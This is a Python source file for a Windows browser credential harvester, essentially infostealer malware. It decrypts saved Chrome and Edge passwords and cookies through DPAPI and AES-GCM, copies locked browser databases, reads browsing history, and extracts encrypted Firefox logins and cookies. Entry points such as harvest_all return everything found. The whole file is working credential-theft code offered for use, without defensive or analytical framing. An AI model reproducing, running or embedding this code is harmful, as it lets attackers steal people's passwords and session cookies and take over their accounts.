# browser.py — Browser credential harvester
#
# Extracts saved passwords, cookies, and history from:
#   - Google Chrome (Chromium DPAPI + AES-GCM)
#   - Microsoft Edge (same engine)
#   - Firefox (logins.json extraction)
#
# Uses ctypes for DPAPI decryption, sqlite3 (stdlib) for database access.
# No external dependencies.

import os
import json
import sqlite3
import base64
import shutil
import ctypes
import ctypes.wintypes
import tempfile

crypt32 = ctypes.windll.crypt32
kernel32 = ctypes.windll.kernel32


# ═══════════════════════════════════════════════════════════════
# DPAPI (CryptUnprotectData) via ctypes
# ═══════════════════════════════════════════════════════════════

class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_ubyte)),
    ]


def _dpapi_decrypt(encrypted: bytes) -> bytes:
    """Decrypt data using Windows DPAPI (CryptUnprotectData).

    Args:
        encrypted: DPAPI-encrypted blob.

    Returns:
        Decrypted plaintext bytes.
    """
    in_blob = DATA_BLOB()
    in_blob.cbData = len(encrypted)
    in_blob.pbData = (ctypes.c_ubyte * len(encrypted))(*encrypted)

    out_blob = DATA_BLOB()

    result = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob),
        None,              # description
        None,              # optional entropy
        None,              # reserved
        None,              # prompt struct
        0,                 # flags
        ctypes.byref(out_blob),
    )

    if not result:
        raise ctypes.WinError()

    data = ctypes.string_at(out_blob.pbData, out_blob.cbData)
    kernel32.LocalFree(out_blob.pbData)
    return data


# ═══════════════════════════════════════════════════════════════
# Chromium-based browser harvesting (Chrome + Edge)
# ═══════════════════════════════════════════════════════════════

def _get_chromium_master_key(local_state_path: str) -> bytes | None:
    """Extract and decrypt the Chromium master key from Local State.

    The encrypted key is stored as base64 in the JSON file under
    os_crypt.encrypted_key. It has a 5-byte 'DPAPI' prefix that
    must be stripped before DPAPI decryption.

    Args:
        local_state_path: Path to the 'Local State' JSON file.

    Returns:
        Decrypted AES-GCM master key, or None on failure.
    """
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)

        # Strip 'DPAPI' prefix (5 bytes)
        encrypted_key = encrypted_key[5:]

        return _dpapi_decrypt(encrypted_key)
    except Exception:
        return None


def _decrypt_chromium_password(encrypted_value: bytes, master_key: bytes) -> str:
    """Decrypt a Chromium-encrypted password.

    Chromium v80+ uses AES-256-GCM:
        - Bytes 0-2: version tag ('v10' or 'v11')
        - Bytes 3-14: 12-byte nonce/IV
        - Bytes 15+: ciphertext + 16-byte GCM tag

    Older versions use DPAPI directly (no version prefix).

    Args:
        encrypted_value: Raw encrypted password bytes from SQLite.
        master_key: Decrypted AES master key.

    Returns:
        Decrypted password string, or empty string on failure.
    """
    try:
        if not encrypted_value:
            return ""

        # Check for AES-GCM (v10/v11 prefix)
        if encrypted_value[:3] in (b"v10", b"v11"):
            nonce = encrypted_value[3:15]     # 12 bytes
            ciphertext = encrypted_value[15:]  # rest is ciphertext + tag

            from Crypto.Cipher import AES
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            # Last 16 bytes are the GCM auth tag
            plaintext = cipher.decrypt_and_verify(
                ciphertext[:-16], ciphertext[-16:]
            )
            return plaintext.decode("utf-8", errors="replace")

        # Legacy DPAPI (no version prefix)
        return _dpapi_decrypt(encrypted_value).decode("utf-8", errors="replace")

    except Exception:
        return ""


def _harvest_chromium(browser_name: str, user_data_path: str) -> dict:
    """Harvest credentials, cookies, and history from a Chromium browser.

    Args:
        browser_name: Display name ('Chrome' or 'Edge').
        user_data_path: Path to 'User Data' directory.

    Returns:
        Dict with passwords, cookies, history lists.
    """
    result = {
        "browser": browser_name,
        "passwords": [],
        "cookies": [],
        "history": [],
    }

    if not os.path.exists(user_data_path):
        result["error"] = f"{browser_name} data directory not found"
        return result

    # Get master key
    local_state_path = os.path.join(user_data_path, "Local State")
    master_key = _get_chromium_master_key(local_state_path)
    if not master_key:
        result["error"] = "Failed to decrypt master key"
        return result

    # Find all profiles (Default, Profile 1, Profile 2, etc.)
    profiles = []
    for name in os.listdir(user_data_path):
        profile_path = os.path.join(user_data_path, name)
        if os.path.isdir(profile_path) and (
            name == "Default" or name.startswith("Profile ")
        ):
            profiles.append((name, profile_path))

    if not profiles:
        profiles = [("Default", os.path.join(user_data_path, "Default"))]

    for profile_name, profile_path in profiles:
        # ── Passwords ──
        login_db = os.path.join(profile_path, "Login Data")
        if os.path.exists(login_db):
            try:
                tmp = _copy_locked_db(login_db)
                conn = sqlite3.connect(tmp)
                cursor = conn.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                )
                for url, username, encrypted_pw in cursor.fetchall():
                    password = _decrypt_chromium_password(encrypted_pw, master_key)
                    if url and (username or password):
                        result["passwords"].append({
                            "profile": profile_name,
                            "url": url,
                            "username": username,
                            "password": password,
                        })
                conn.close()
                os.unlink(tmp)
            except Exception:
                pass

        # ── Cookies ──
        cookie_db = os.path.join(profile_path, "Network", "Cookies")
        if not os.path.exists(cookie_db):
            cookie_db = os.path.join(profile_path, "Cookies")
        if os.path.exists(cookie_db):
            try:
                tmp = _copy_locked_db(cookie_db)
                conn = sqlite3.connect(tmp)
                cursor = conn.execute(
                    "SELECT host_key, name, encrypted_value FROM cookies LIMIT 500"
                )
                for host, name, encrypted_val in cursor.fetchall():
                    value = _decrypt_chromium_password(encrypted_val, master_key)
                    if host and name:
                        result["cookies"].append({
                            "profile": profile_name,
                            "host": host,
                            "name": name,
                            "value": value[:200],  # Cap cookie value
                        })
                conn.close()
                os.unlink(tmp)
            except Exception:
                pass

        # ── History ──
        history_db = os.path.join(profile_path, "History")
        if os.path.exists(history_db):
            try:
                tmp = _copy_locked_db(history_db)
                conn = sqlite3.connect(tmp)
                cursor = conn.execute(
                    "SELECT url, title, visit_count FROM urls "
                    "ORDER BY last_visit_time DESC LIMIT 200"
                )
                for url, title, visits in cursor.fetchall():
                    result["history"].append({
                        "profile": profile_name,
                        "url": url,
                        "title": title or "",
                        "visits": visits,
                    })
                conn.close()
                os.unlink(tmp)
            except Exception:
                pass

    return result


def _copy_locked_db(db_path: str) -> str:
    """Copy a locked SQLite database to a temp file for reading.

    The browser locks its databases while running. We copy the file
    to a temp location to read it without conflicts.

    Args:
        db_path: Path to the locked database.

    Returns:
        Path to the temporary copy.
    """
    tmp = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
    tmp_path = tmp.name
    tmp.close()
    shutil.copy2(db_path, tmp_path)
    return tmp_path


# ═══════════════════════════════════════════════════════════════
# Firefox harvesting
# ═══════════════════════════════════════════════════════════════

def _harvest_firefox() -> dict:
    """Harvest saved login data from Firefox profiles.

    Firefox uses NSS for encryption, which requires the NSS libraries
    to fully decrypt. We extract the encrypted data and profile info.
    On systems where Firefox is installed, we attempt to use its
    own nss3.dll for decryption.

    Returns:
        Dict with extracted login data per profile.
    """
    result = {
        "browser": "Firefox",
        "passwords": [],
        "cookies": [],
    }

    profiles_dir = os.path.join(
        os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles"
    )
    if not os.path.exists(profiles_dir):
        result["error"] = "Firefox profiles directory not found"
        return result

    for profile_name in os.listdir(profiles_dir):
        profile_path = os.path.join(profiles_dir, profile_name)
        if not os.path.isdir(profile_path):
            continue

        # ── Logins (logins.json) ──
        logins_file = os.path.join(profile_path, "logins.json")
        if os.path.exists(logins_file):
            try:
                with open(logins_file, "r", encoding="utf-8") as f:
                    logins_data = json.load(f)

                for login in logins_data.get("logins", []):
                    result["passwords"].append({
                        "profile": profile_name,
                        "url": login.get("hostname", ""),
                        "username_encrypted": login.get("encryptedUsername", ""),
                        "password_encrypted": login.get("encryptedPassword", ""),
                        "times_used": login.get("timesUsed", 0),
                        "note": "NSS-encrypted — use Firefox NSS libs to decrypt",
                    })
            except Exception:
                pass

        # ── Cookies (cookies.sqlite) ──
        cookies_db = os.path.join(profile_path, "cookies.sqlite")
        if os.path.exists(cookies_db):
            try:
                tmp = _copy_locked_db(cookies_db)
                conn = sqlite3.connect(tmp)
                cursor = conn.execute(
                    "SELECT host, name, value FROM moz_cookies LIMIT 500"
                )
                for host, name, value in cursor.fetchall():
                    result["cookies"].append({
                        "profile": profile_name,
                        "host": host,
                        "name": name,
                        "value": value[:200],
                    })
                conn.close()
                os.unlink(tmp)
            except Exception:
                pass

    return result


# ═══════════════════════════════════════════════════════════════
# Public API
# ═══════════════════════════════════════════════════════════════

def harvest_chrome() -> dict:
    """Harvest credentials from Google Chrome."""
    user_data = os.path.join(
        os.environ.get("LOCALAPPDATA", ""),
        "Google", "Chrome", "User Data",
    )
    return _harvest_chromium("Chrome", user_data)


def harvest_edge() -> dict:
    """Harvest credentials from Microsoft Edge."""
    user_data = os.path.join(
        os.environ.get("LOCALAPPDATA", ""),
        "Microsoft", "Edge", "User Data",
    )
    return _harvest_chromium("Edge", user_data)


def harvest_firefox() -> dict:
    """Harvest credentials from Firefox."""
    return _harvest_firefox()


def harvest_all() -> dict:
    """Harvest credentials from all supported browsers.

    Returns:
        Dict with results from Chrome, Edge, and Firefox.
    """
    return {
        "status": "ok",
        "chrome": harvest_chrome(),
        "edge": harvest_edge(),
        "firefox": harvest_firefox(),
    }
